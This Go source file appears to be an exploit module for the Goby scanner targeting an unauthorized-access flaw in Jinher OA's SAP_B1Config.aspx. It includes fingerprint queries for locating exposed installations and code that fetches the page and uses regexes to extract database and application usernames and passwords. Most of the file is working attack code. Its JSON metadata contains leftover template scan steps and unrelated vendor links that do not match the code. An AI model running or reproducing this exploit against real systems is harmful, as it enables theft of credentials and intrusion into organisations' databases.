package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "JinHe OA /C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1 Unauthorized Access Vulnerability",
    "Description": "<p>Jinhe QA Office System is an enterprise-level management software that integrates office automation, collaborative office workflow management and other functions. Jinhe OA Office System provides multiple modules, including schedule management, file management, email management, personnel management, customer management, project management, etc. Users can choose the required modules to use according to their needs. The system/SAP_B1Config.aspx has an unauthorized access vulnerability, and attackers can use this vulnerability to obtain sensitive information such as database account passwords</p>",
    "Product": "Jinher-OA",
    "Homepage": "http://www.jinher.com/",
    "DisclosureDate": "2024-09-13",
    "PostTime": "2024-10-17",
    "Author": "2826161446@qq.com",
    "FofaQuery": "(title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || body=\"href=\\\"/jc6/platform/\\\"\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\"))",
    "GobyQuery": "(title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || body=\"href=\\\"/jc6/platform/\\\"\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\"))",
    "Level": "1",
    "Impact": "<p>The system/SAP_B1Config.aspx has an unauthorized access vulnerability, and attackers can use this vulnerability to obtain sensitive information such as database account passwords</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability. Please contact the manufacturer to fix the vulnerability:<a href=\"http://www.jinher.com/\">http://www.jinher.com/</a><a href=\"https://www.star-net.cn/index.php\"></a><a href=\"https://github.com/sylabs/sif\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall . </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/weixin_69010236/article/details/135510985"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "db_info",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access",
        "HW-2024"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "金和OA /C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1 未授权访问漏洞",
            "Product": "金和网络-金和OA",
            "Description": "<p>金和QA办公系统是.款集合了办公自动化协同办公工作流管理等功能的企业级管理软件。金和OA办公系统提供了多个模块，包括日程管理、文件管理、邮件管理、人事管理、客户管理、项目管理等。用户可以根据自己的需求选择需要的模块进行使用。该系统/SAP_B1Config.aspx存在未授权访问漏洞，攻击者可通过此漏洞获取数据库的账户密码等敏感信息&nbsp;<br></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.jinher.com/\">http://www.jinher.com/</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>该系统/SAP_B1Config.aspx存在未授权访问漏洞，攻击者可通过此漏洞获取数据库的账户密码等敏感信息&nbsp;<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "JinHe OA /C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1 Unauthorized Access Vulnerability",
            "Product": "Jinher-OA",
            "Description": "<p>Jinhe QA Office System is an enterprise-level management software that integrates office automation, collaborative office workflow management and other functions. Jinhe OA Office System provides multiple modules, including schedule management, file management, email management, personnel management, customer management, project management, etc. Users can choose the required modules to use according to their needs. The system/SAP_B1Config.aspx has an unauthorized access vulnerability, and attackers can use this vulnerability to obtain sensitive information such as database account passwords<br></p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability. Please contact the manufacturer to fix the vulnerability:<a href=\"http://www.jinher.com/\">http://www.jinher.com/</a><a href=\"https://www.star-net.cn/index.php\"></a><a href=\"https://github.com/sylabs/sif\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall .&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The system/SAP_B1Config.aspx has an unauthorized access vulnerability, and attackers can use this vulnerability to obtain sensitive information such as database account passwords<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9961"
}`

	postOrGet_4MOFgcJkvn := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
		}

		resp, err := setGetRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1": "txtDatabaseServer",
			}
			// 函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"db_info": {"/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1", "txtDatabaseServer"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			//数据库登录账号
			regular := `name="txtDatabaseUsername" type="text" value="([^"]+)`
			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			output1, err := makeRegular(resp, regular)
			//数据库登录密码
			regular2 := `name="txtDatabasePassword" type="text" value="([^"]+)`
			makeRegular2 := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			output2, err := makeRegular2(resp, regular2)

			//程序登录账号
			regular3 := `name="txtUserName" type="text" value="([^"]+)`
			makeRegular3 := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			output3, err := makeRegular3(resp, regular3)

			//程序登录密码
			regular4 := `name="txtUserPassword" type="text" value="([^"]+)`
			makeRegular4 := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			output4, err := makeRegular4(resp, regular4)

			expResult.Success = true
			expResult.Output = "数据库登录账号: " + output1 + "\n数据库登录密码: " + output2 + "\n程序登录账号: " + output3 + "\n程序登录密码: " + output4

			return expResult
		},
	))
}
